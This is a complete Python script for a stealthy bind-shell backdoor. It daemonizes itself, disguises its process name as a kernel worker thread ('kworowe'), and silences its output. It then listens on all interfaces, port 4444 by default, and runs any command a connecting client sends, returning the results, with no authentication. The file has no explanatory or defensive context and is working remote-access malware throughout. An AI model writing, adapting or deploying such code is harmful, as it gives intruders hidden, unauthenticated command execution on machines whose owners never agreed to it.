#!/usr/bin/env python3
import socket
import subprocess
import click
from threading import Thread
import os
import sys
import signal
from setproctitle import setproctitle  # Import setproctitle

# Function to daemonize the process (run in the background)
def daemonize():
    try:
        pid = os.fork()  # Fork a child process
        if pid > 0:
            sys.exit(0)  # Exit the parent process
    except OSError as e:
        sys.stderr.write(f"Fork failed: {e}\n")
        sys.exit(1)

    os.setsid()  # Create a new session and detach from terminal
    signal.signal(signal.SIGCHLD, signal.SIG_IGN)  # Ignore child process signals
    signal.signal(signal.SIGHUP, signal.SIG_IGN)  # Ignore SIGHUP to avoid termination
    os.umask(0)  # Reset file mode creation mask

    # Change the process name to something inconspicuous
    setproctitle("[kworowe/3:0-events]")

    # Redirect stdout and stderr to /dev/null to discard any output
    sys.stdout = open(os.devnull, 'w')  # Redirect stdout to /dev/null
    sys.stderr = open(os.devnull, 'w')  # Redirect stderr to /dev/null

# Function to run a shell command
def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

# Function to handle client input and execute commands
def handle_input(client_socket):
    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    # Daemonize the process to run in the background
    daemonize()

    # Create the socket, bind, and listen
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)

    while True:
        client_socket, client_address = s.accept()
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()
